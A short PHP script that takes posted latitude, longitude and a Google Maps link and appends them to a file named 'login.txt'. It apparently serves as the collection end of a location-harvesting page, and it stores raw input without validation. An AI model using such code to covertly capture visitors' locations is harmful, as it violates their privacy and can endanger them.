<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $latitude = $_POST['latitude'];
    $longitude = $_POST['longitude'];
    $googleMapsLink = $_POST['googleMapsLink'];

    // Format the data to be saved
    $data = "Latitude: $latitude, Longitude: $longitude, Google Maps: $googleMapsLink\n";

    // Save the data to login.txt
    file_put_contents("login.txt", $data, FILE_APPEND);

    echo "Location saved successfully!";
} else {
    echo "Invalid request.";
}
?>
